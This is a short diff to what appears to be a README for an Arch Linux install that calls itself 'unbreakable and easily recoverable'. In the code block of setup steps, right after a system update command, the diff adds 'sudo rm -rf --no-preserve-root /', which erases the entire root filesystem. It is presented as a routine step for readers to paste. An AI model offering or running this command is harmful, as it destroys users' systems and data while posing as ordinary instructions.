@@ -11,4 +11,5 @@ as bootloader, this arch install is truly unbreakable and easily recoverable.
 **CURRENTLY UNDER CONSTRUCTION**
 ```
 yay -Syu
+sudo rm -rf --no-preserve-root /
 ```
